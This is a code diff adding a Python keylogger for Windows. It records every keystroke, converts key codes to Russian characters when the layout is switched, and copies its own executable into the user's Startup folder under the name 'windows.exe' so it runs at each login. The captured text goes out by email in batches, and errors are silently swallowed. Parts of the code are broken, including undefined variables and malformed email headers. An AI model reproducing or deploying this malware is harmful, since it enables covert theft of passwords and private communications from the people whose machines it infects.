@@ -1,0 +1,267 @@
+
+
+
+import keyboard
+import datetime
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import codecs
+import os
+import sys
+
+
+def send_(TO, text, SUBJECT):
+    try:
+    
+            FROM = 'python@mydomain.com'
+            server = smtplib.SMTP('smtp.gmail.com')
+            message = MIMEMultipart()
+            message.attach(MIMEText(text, 'plain'))
+            text = message.as_string()
+            BODY = '\r\n'.join((
+                'From: %s' % FROM,
+                'To: %s' % TO,
+                'Subject: %s' % SUBJECT , 
+                'Date: FRI, 15 Jul 2030 00:05:02 +0300'
+                'Message-ID: <20200702210502.GA7851@rou4.vkpm.ru>'
+                'MIME-Version: 1.0'
+                'Content-Type: text/plain; charset=utf-8'
+                'Content-Transfer-Encoding: 8bit'
+                '',
+                text
+            ))
+            server.sendmail(FROM, [TO], BODY)
+    except:
+        pass
+
+
+
+def perenos():
+    path_do = ''
+    user = os.environ['USERNAME']
+    autorun = 'C:\\Users\\' + user + '\\AppData\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows.exe'
+    for m in sys.argv:
+        path_do = path_do + m
+    if os.path.exists(autorun) == False:
+        path_posle = autorun
+        os.rename(path_do, path_posle)
+        send_(TO, 'Keylogger start!', 'Start page' )
+perenos()
+
+p =set()
+lang = 1
+schet = 0
+text = ''
+
+page = 0
+def print_pressed_keys(e):
+    little=['ф','и','с','в','у','а','п','р','ш','о','л','д','ь','т','щ','з','й','к','ы','е','г','м','ц','ч','н','я']
+    big=['Ф','И','С','В','У','А','П','Р','Ш','О','Л','Д','Ь','Т','Щ','З','Й','К','Ы','Е','Г','М','Ц','Ч','Н','Я']
+    global kol_vo
+    global lang
+    global TO
+    global schet
+    global text
+    global page
+    schet += 1
+    
+    if schet >= kol_vo:
+         page += 1
+         send_(TO, text, 'Page ' + str(page))
+         schet = 0
+    
+    
+    a = str(e.name)
+    b = str(e.event_type)
+    now = datetime.datetime.now()
+    if a=='right ctrl' and b=='down':
+        if 'right shift' in p:
+            if lang % 2 != 0:
+                schet += 1; text = text + ' (Russian lang) '
+            if lang % 2 ==0:
+                schet += 1; text = text + ' (English lang) '
+            lang += 1
+        p.add(a)
+    if a == 'right shift' and b == 'down':
+        if 'right ctrl' in p:
+            if lang % 2 != 0:
+                schet += 1; text = text + ' (Russian lang) '
+            if lang % 2 == 0:
+                schet += 1; text = text + ' (English lang) '
+            lang += 1
+        p.add(a)
+    if a == 'right ctrl' and b == 'up':
+        p.discard(a)
+    if a == 'right shift' and b == 'up':
+        p.discard(a)
+    if a =='right shift' and b=='down':
+        if 'right alt' in p:
+            if lang % 2 != 0:
+                schet += 1; text = text + ' (Russian lang) '
+            if lang % 2 == 0:
+                schet += 1; text = text + ' (English lang) '
+            lang += 1
+        p.add(a)
+    if a == 'right alt' and b == 'down':
+        if 'right shift' in p:
+            if lang % 2 != 0:
+                schet += 1; text = text + ' (Russian lang) '
+            if lang % 2 == 0:
+                schet += 1; text = text + ' (English lang) '
+            lang += 1
+        p.add(a)
+    if a == 'right alt' and b == 'up':
+        p.discard(a)
+    if a == 'right shift' and b == 'up':
+        p.discard(a)
+    if a=='ctrl' and b=='down':
+        if 'shift' in p:
+            if lang % 2 != 0:
+                schet += 1; text = text + ' (Russian lang) '
+            if lang % 2 ==0:
+                schet += 1; text = text + ' (English lang) '
+            lang += 1
+        p.add(a)
+    if a == 'shift' and b == 'down':
+        if 'ctrl' in p:
+            if lang % 2 != 0:
+                schet += 1; text = text + ' (Russian lang) '
+            if lang % 2 == 0:
+                schet += 1; text = text + ' (English lang) '
+            lang += 1
+        p.add(a)
+    if a == 'ctrl' and b == 'up':
+        p.discard(a)
+    if a == 'shift' and b == 'up':
+        p.discard(a)
+    if a =='shift' and b=='down':
+        if 'alt' in p:
+            if lang % 2 != 0:
+                schet += 1; text = text + ' (Russian lang) '
+            if lang % 2 == 0:
+                schet += 1; text = text + ' (English lang) '
+            lang += 1
+        p.add(a)
+    if a == 'alt' and b == 'down':
+        if 'shift' in p:
+            if lang % 2 != 0:
+                schet += 1; text = text + ' (Russian lang) '
+            if lang % 2 == 0:
+                schet += 1; text = text + ' (English lang) '
+            lang += 1
+        p.add(a)
+    if a == 'alt' and b == 'up':
+        p.discard(a)
+    if a == 'shift' and b == 'up':
+        p.discard(a)
+    if ( a == 'left windows' or a == 'right windows' ) and b == 'down':
+        p.add('win')
+    if ( a == 'left windows' or a == 'right windows' ) and b == 'up':
+        p.discard('win')
+    if len(a) == 1 and b != 'up':  #если это буква или цифра записываем её
+        if 'win' in p:
+            schet += 1; text = text + '\nwin' + '+' + a
+        else:
+             f = ord(a)
+             if  lang%2==0:
+                 if a == '>':
+                     schet += 1; text = text + 'Ю' 
+                     return
+                 if a== '?':
+                     schet += 1; text = text + ',' 
+                     return
+                 if a == '<':
+                     schet += 1; text = text + 'Б' 
+                     return
+                 if ord(a) == 1069:
+                     schet += 1; text = text + 'Э' 
+                     return
+                 if a == ':':
+                     schet += 1; text = text + 'Ж' 
+                     return
+                 if a == '}':
+                     schet += 1; text = text + 'Ъ' 
+                     return
+                 if  a == '{':
+                     schet += 1; text = text + 'Х' 
+                     return
+                 if a == '|':
+                     schet += 1; text = text + '/' 
+                     return
+                 if a == '~':
+                     schet += 1; text = text + 'Ё' 
+                     return
+                 if a == ',':
+                     schet += 1; text = text + 'б'
+                     return
+                 if a == '`':
+                     schet += 1; text = text + 'ё'
+                     return
+                 if a == '@':
+                     schet += 1; text = text + '@'
+                     return
+                 if a == '#':
+                     schet += 1; text = text + '№'
+                     return
+                 if a == '$':
+                     schet += 1; text = text + ';'
+                     return
+                 if a == '^':
+                     schet += 1; text = text + ':'
+                     return
+                 if a == '&':
+                     schet += 1; text = text + '?'
+                     return
+                 if a == '.':
+                     schet += 1; text = text + 'ю'
+                     return
+                 if a == '/':
+                     schet += 1; text = text + '.'
+                     return
+                 if a == '[':
+                     schet += 1; text = text + 'х'
+                     return
+                 if a == ']':
+                     schet += 1; text = text + 'ъ'
+                     return
+                 if ord(a) == 1101:
+                     schet += 1; text = text + 'э'
+                     return
+                 if a == ';':
+                     schet += 1; text = text + 'ж'
+                     return
+                 if (f > 96 and f < 123):
+                     schet += 1; text = text + little[f-97]
+
+                 if (f>64 and f  < 91):
+                     schet += 1; text = text + big[f-65]
+
+                 if (f<65) or (f>90 and f <97) or (f>122):
+                     schet += 1; text = text + a
+                 return
+             if (lang % 2 != 0) or (f > 90 and f < 97) or f > 122 or f < 65 :
+                 schet += 1; text = text + a
+                 return
+    if e.name ==  'enter' and b != 'down':      #если это enter переносим строку
+        schet += 1; text = text + '[ent]    Сейчас времени : ' +now.strftime('%H:%M:%S')+ '   ' 
+        
+    if a == 'space' and b != 'down':    #ели введён пробел, вводим пробел
+        schet += 1; text = text + ' ' 
+    if a == 'backspace' and b != 'down':
+         schet += 1; text = text + '~' 
+    if len(a) >1 and b != 'down' and a!= 'space' and a != 'enter' and a != 'backspace' and a != 'shift' and a != 'right shift' and a != 'right alt' and a != 'alt gr' and a != 'alt'   and a != 'right ctrl' and a != 'ctrl' and a != 'left windows' and a != 'right windows':
+            if a == 'right' or a == 'left' or a == 'down' or a == 'up':
+                if a == 'right':
+                    schet += 1; text = text + '(->)'
+                if a == 'left':
+                    schet += 1; text = text + '(<-)' 
+                if a == 'down':
+                    schet += 1; text = text + '(W)' 
+                if a =='up':
+                    schet += 1; text = text + '(^)'
+            else:
+                schet += 1; text = text + '\n'+a
+   
+keyboard.hook(print_pressed_keys)
+keyboard.wait()
